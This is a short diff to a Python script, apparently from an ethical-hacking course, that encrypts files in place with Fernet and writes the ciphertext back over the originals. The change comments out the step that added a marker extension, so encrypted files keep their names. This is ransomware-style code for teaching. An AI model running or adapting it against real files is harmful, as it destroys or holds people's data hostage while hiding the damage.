@@ -4,7 +4,7 @@ from cryptography.fernet import Fernet
 import os
 
 #Extension de los archivos
-extension= 'IUEHackeoEtico202302'
+#extension= 'IUEHackeoEtico202302'
 
 #Generacion de la llave de cifrado
 def generar_key():
@@ -30,7 +30,8 @@ def cifrar(items,key):
         with open(item,'wb') as file:
             file.write(encrypted_data)
 
-        os.rename(item,item + '.' + extension)
+        os.rename(item,item)
+        #os.rename(item,item + '.' + extension)
 
 
 if __name__=='__main__':
